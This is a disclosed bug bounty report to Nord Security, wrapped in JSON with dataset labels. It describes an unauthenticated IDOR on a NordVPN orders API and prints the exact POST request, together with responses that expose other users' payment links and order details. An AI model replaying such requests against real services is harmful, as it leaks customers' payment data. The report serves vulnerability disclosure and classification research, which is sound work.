{
  "reported_to": "Nord Security",
  "reported_by": "dakitu ",
  "title": "IDOR allow access to payments data of any user",
  "content": "\nsimple send this POST request (no need any auth):\nPOST /api/v1/orders HTTP/1.1 Host: join.nordvpn.com Accept: application/json Accept-Language: en-US,en;q=0.5 Content-Type: application/json Content-Length: 179 DNT: 1 Connection: close\n{\"payment\":{\"provider_method_account\":\"6xdxdd\",\"parameters\":{}},\"action\":\"order\",\"plan_id\":653,\"user_id\":20027039,\"tax_country_code\":\"TW\",\"payment_retry\":0,\"is_installment\":false}\nwill respond:\n{\"id\":42615458,\"user_id\":20027039,\"confirmation\":{\"id\":23093398,\"created_at\":\"2019-12-04 17:01:35\",\"updated_at\":\"2019-12-04 17:01:35\",\"type\":\"redirect_post\",\"value\":\"{\\\"url\\\":\\\"https:\\\\\\/\\\\\\/www.coinpayments.net\\\\\\/index.php\\\",\\\"parameters\\\":{\\\"cmd\\\":\\\"_pay\\\",\\\"reset\\\":1,\\\"email\\\":\\\"\u2588\u2588\u2588\u2588\u2588\\\",\\\"merchant\\\":\\\"e64a9629f9a68cdeab5d0edd21b068d3\\\",\\\"currency\\\":\\\"USD\\\",\\\"amountf\\\":125.64,\\\"item_name\\\":\\\"VPN order\\\",\\\"invoice\\\":\\\"49476958\\\",\\\"success_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/payments\\\\\\/callback\\\\\\/264cae0b89e44a7bd263431b68d1122d\\\",\\\"cancel_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/order\\\\\\/error\\\\\\/?error_alert=payment&eu=1\\\",\\\"want_shipping\\\":0}}\"}}\nchange user_id to 23093782 and you will get:\n{\"id\":42616121,\"user_id\":89495166,\"confirmation\":{\"id\":23093782,\"created_at\":\"2019-12-04 17:16:14\",\"updated_at\":\"2019-12-04 17:16:14\",\"type\":\"redirect\",\"value\":\"https:\\/\\/pay.gocardless.com\\/flow\\/RE000W16X7XH4JCXJZ623MS6H7W316N3\"}}\nchange id to 89495247 (my test account) and you will get:\n{\"id\":42616142,\"user_id\":89495247,\"confirmation\":{\"id\":23093800,\"created_at\":\"2019-12-04 17:16:48\",\"updated_at\":\"2019-12-04 17:16:48\",\"type\":\"redirect_post\",\"value\":\"{\\\"url\\\":\\\"https:\\\\\\/\\\\\\/www.coinpayments.net\\\\\\/index.php\\\",\\\"parameters\\\":{\\\"cmd\\\":\\\"_pay\\\",\\\"reset\\\":1,\\\"email\\\":\\\"hackerhacker@test.pl\\\",\\\"merchant\\\":\\\"e64a9629f9a68cdeab5d0edd21b068d3\\\",\\\"currency\\\":\\\"USD\\\",\\\"amountf\\\":125.64,\\\"item_name\\\":\\\"VPN order\\\",\\\"invoice\\\":\\\"49478089\\\",\\\"success_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/payments\\\\\\/callback\\\\\\/4513bd083a97e1b5c23c69096d89ac80\\\",\\\"cancel_url\\\":\\\"https:\\\\\\/\\\\\\/join.nordvpn.com\\\\\\/order\\\\\\/error\\\\\\/?error_alert=payment&eu=0\\\",\\\"want_shipping\\\":0}}\"}}\nJust letting You know that i submited this bug today on support@nordvpn.com from lewiatan~@ cause i wasn't able to report it via hackerone.\nImpact\nleak sensitive customer data\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Insecure Direct Object Reference (IDOR)"
  ],
  "screenshots": {},
  "disclosed_date": 1580889180,
  "report_url": "https://hackerone.com/reports/751577",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to `/api/v1/orders` with a JSON payload containing a `user_id` field."
    ],
    [
      2,
      "Change the `user_id` value in the request to access payment data of other users."
    ]
  ],
  "vuln_description": "The vulnerability is an Insecure Direct Object Reference (IDOR) that allows unauthorized access to payment data of any user by simply changing the `user_id` parameter in a POST request to the `/api/v1/orders` endpoint. The endpoint does not perform proper authorization checks, enabling an attacker to view sensitive payment information of other users.",
  "reason": "The vulnerability is straightforward to exploit as it only requires modifying a single parameter in a request. There are no complex interactions or states involved, and the attack does not require any novel or uncommon logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": true,
  "authnz_byppass_detectable": false,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves an unauthenticated POST request where the 'user_id' parameter can be altered to access different users' payment data. The methodology's step d) (execute actions with unauthenticated sessions) directly applies here, as no session is required. Additionally, step e) (substitute resource_ids) is relevant since changing the 'user_id' allows unauthorized access to other users' resources. This fits the IDOR detection pattern via parameter manipulation without authentication checks.",
    "is_simple_authnz": true
  }
}